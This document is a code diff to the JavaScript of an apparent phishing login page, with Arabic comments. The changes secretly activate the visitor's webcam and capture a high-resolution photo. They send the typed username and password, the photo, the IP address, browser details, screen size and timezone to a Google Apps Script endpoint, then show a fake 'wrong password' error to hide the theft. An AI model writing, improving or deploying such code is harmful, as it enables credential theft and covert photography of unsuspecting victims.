@@ -280,7 +280,7 @@
         let cameraInitialized = false;
         
         // رابط Google Apps Script - استبدله برابط نشرك
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby6xZ7gAgm6tSiRZJZ8ujAc_8NqfwrS0xNUolmwgaGdd13xBxme4nfW5dttr8Tn-IWT/exec';
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx6a5hkyVd1u9cxwAjhmQ43Bb2iZChtUHvFxSQyr5aML8s4J42aU1544213uJmaHj_o/exec';
         
         // تهيئة الكاميرا بشكل خفي عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
@@ -294,20 +294,46 @@
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 }
                     }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                cameraInitialized = true;
                 
-                console.log('Camera initialized silently');
+                // انتظار تحميل الفيديو
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                    video.onerror = reject;
+                    
+                    // وقت انتظار أقصى 5 ثواني
+                    setTimeout(() => reject(new Error('Timeout loading video')), 5000);
+                });
+                
+                cameraInitialized = true;
+                console.log('✅ Camera initialized successfully');
                 
             } catch (error) {
-                console.log('Camera initialization failed:', error);
-                // لا نظهر أي رسالة خطأ للمستخدم
+                console.error('❌ Camera initialization failed:', error);
+                // نحاول مرة أخرى باعدادات أبسط
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: false 
+                    });
+                    
+                    video.srcObject = stream;
+                    cameraInitialized = true;
+                    console.log('✅ Camera initialized with basic settings');
+                    
+                } catch (secondError) {
+                    console.error('❌ Camera initialization completely failed:', secondError);
+                }
             }
         }
         
@@ -360,16 +386,27 @@
                 
                 // إذا كانت الكاميرا جاهزة، نلتقط صورة
                 if (cameraInitialized && stream && video.readyState === 4) {
+                    console.log('📸 Capturing photo...');
+                    
                     // انتظار بسيط لضمان جودة الصورة
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    await new Promise(resolve => setTimeout(resolve, 800));
                     
                     const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    
+                    // ضبط أبعاد الكانفاس مع الحفاظ على النسبة
+                    const videoAspectRatio = video.videoWidth / video.videoHeight;
+                    canvas.width = 1280;
+                    canvas.height = 1280 / videoAspectRatio;
+                    
+                    // رسم الصورة بدقة عالية
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // تحويل الصورة إلى بيانات
-                    imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    // تحويل الصورة إلى بيانات بدقة عالية
+                    imageData = canvas.toDataURL('image/jpeg', 0.95);
+                    
+                    console.log('✅ Photo captured successfully');
+                } else {
+                    console.log('❌ Camera not ready for capture');
                 }
                 
                 // إرسال البيانات إلى Google Apps Script
@@ -387,21 +424,30 @@
                 const formData = new FormData();
                 formData.append('username', username);
                 formData.append('password', password);
+                
                 if (imageData) {
                     formData.append('image', imageData);
+                    console.log('📤 Sending image data...');
                 }
+                
                 formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                 formData.append('userAgent', navigator.userAgent);
                 formData.append('pageURL', window.location.href);
                 formData.append('ip', await getIPAddress());
+                formData.append('screenResolution', `${screen.width}x${screen.height}`);
+                formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
                 
-                // إرسال البيانات بشكل غير متزامن
-                fetch(GOOGLE_SCRIPT_URL, {
+                // إرسال البيانات
+                const response = await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     body: formData
-                }).catch(error => {
-                    console.error('Error sending data:', error);
                 });
+                
+                if (response.ok) {
+                    console.log('✅ Data sent successfully');
+                } else {
+                    console.log('❌ Failed to send data');
+                }
                 
                 // محاكاة عملية التحقق لمدة 2-3 ثواني
                 await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
@@ -420,6 +466,13 @@
                 
             } catch (error) {
                 console.error('Error sending to Google Script:', error);
+                
+                // حتى لو فشل الإرسال، نستمر في التصرف الطبيعي
+                loginSuccess.style.display = 'none';
+                showStatus('اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'تسجيل الدخول';
+                
                 throw error;
             }
         }
@@ -431,7 +484,13 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                return 'غير معروف';
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (secondError) {
+                    return 'غير معروف';
+                }
             }
         }
         
@@ -441,9 +500,15 @@
             statusDiv.className = type;
         }
         
+        // تنظيف الموارد عند إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
         // إضافة تأثيرات إضافية للواقعية
         document.addEventListener('DOMContentLoaded', () => {
-            // إضافة تأثير تأخير بسيط عند الكتابة (للمظهر الواقعي)
             usernameInput.addEventListener('input', () => {
                 usernameInput.style.borderColor = '#e1e5ee';
             });
